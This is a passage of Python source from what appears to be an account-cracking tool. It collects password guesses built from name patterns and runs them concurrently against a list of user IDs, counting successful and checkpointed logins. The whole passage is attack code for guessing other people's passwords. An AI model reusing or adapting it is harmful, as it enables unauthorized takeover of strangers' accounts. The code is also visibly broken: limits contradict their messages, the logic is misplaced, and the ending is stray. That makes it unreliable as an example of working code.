            clear()
            print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'{S}[{R}={G5}]{S} PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'{G5}[{R}={G5}]{S} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{rad}[{white}◆{rad}] {green}PASSWORD NO {white}{sr+1} {rad}➣{green} '))
            clear()
            print(f'{rad}[{white}◆{rad}] {green}TOTAL UID  {white}➣{gren} %s ' % len(self.id))
            print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT {rad}({white}ON{green}/{white}OF{rad}){green} AIRPLAN MOOD')
            linex()
            with Adnan(max_workers=90) as sexy:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                Adnan.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                Adnan.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                Adnan.submit(self.methodC, uid, name, pwx)
                   except:pass
            result(oks,cps)

menu()'))